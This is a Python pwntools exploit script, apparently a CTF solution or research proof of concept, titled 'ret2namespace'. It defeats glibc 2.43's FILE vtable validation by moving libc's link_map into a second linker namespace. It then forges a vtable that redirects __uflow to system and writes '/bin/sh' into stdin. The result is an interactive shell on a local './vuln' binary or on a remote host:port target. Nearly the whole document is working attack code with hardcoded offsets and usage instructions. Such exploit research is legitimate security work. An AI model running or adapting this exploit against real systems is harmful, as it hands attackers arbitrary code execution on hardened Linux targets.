#!/usr/bin/env python3
"""
ret2namespace — Namespace Injection Bypass (glibc 2.43, BIND_NOW)

Bypasses _IO_vtable_check by moving libc's link_map into namespace 1.
The vtable validator sees l_ns != 0 and accepts the forged vtable.

Target: glibc 2.43 x86_64, Full RELRO + BIND_NOW + PIE + NX

Usage:
  python3 solve.py                    # local ./vuln
  python3 solve.py host:port          # remote
"""
from pwn import *
import time

context.arch = "amd64"
context.log_level = "info"

# glibc 2.43-2ubuntu2 x86_64
STDIN_IN_LIBC  = 0x2128e0
SYSTEM_OFF     = 0x5c560
LD_DRIFT       = 0x18720     # ld_base - stdin (build constant)
RG_IN_LD       = 0x3d000     # _rtld_global in ld
VDSO_LM_IN_LD  = 0x3e8c0    # vdso link_map in ld
NS_SIZE        = 0x70        # sizeof(struct link_namespaces) in 2.43
DL_NNS_OFF     = 0x700      # 16 * NS_SIZE
FAKE_VT        = 0x200
UFLOW_SLOT     = 0x28

# link_map offset from stdin — depends on the number of loaded DSOs.
# These values are for the vuln.c PoC compiled locally against glibc 2.43.
# Recompute with the offset probe script if targeting a different binary.
LM_FROM_STDIN  = 0xe980
LM_LNS         = 0xe9b0


def exploit(target=None):
    if target:
        p = remote(*target)
    else:
        p = process("./vuln")

    p.recvuntil(b"stdin: ")
    stdin_addr = int(p.recvline().strip(), 16)
    p.recvuntil(b"format:")
    p.recvline()

    libc_base = stdin_addr - STDIN_IN_LIBC
    libc_lm   = stdin_addr + LM_FROM_STDIN
    system    = libc_base + SYSTEM_OFF
    rg        = LD_DRIFT + RG_IN_LD

    log.info(f"libc  = {hex(libc_base)}")
    log.info(f"stdin = {hex(stdin_addr)}")

    def wb(o, v):
        p.sendline(f"{o} {v:02x}".encode())

    def wq(o, v):
        for i, b in enumerate(p64(v)):
            wb(o + i, b)

    # namespace injection
    wq(LD_DRIFT + VDSO_LM_IN_LD + 0x18, 0)   # unlink libc from ns0
    wb(LM_LNS, 1)                              # libc_lm->l_ns = 1
    wq(rg + NS_SIZE, libc_lm)                  # ns[1]._ns_loaded
    wb(rg + DL_NNS_OFF, 2)                     # dl_nns = 2

    # fake vtable + trigger
    wq(FAKE_VT + UFLOW_SLOT, system)           # __uflow → system
    for i, b in enumerate(b"/bin/sh\x00"):
        wb(i, b)                                # stdin → "/bin/sh"
    wq(0xd8, stdin_addr + FAKE_VT)             # vtable → fake

    time.sleep(0.3)
    p.sendline(b"BREAK")
    time.sleep(0.3)
    p.sendline(b"id")
    log.success(p.recvline(timeout=3).decode().strip())
    p.interactive()


if __name__ == "__main__":
    import sys
    target = None
    for arg in sys.argv[1:]:
        if ":" in arg:
            host, port = arg.rsplit(":", 1)
            target = (host, int(port))
    exploit(target=target)
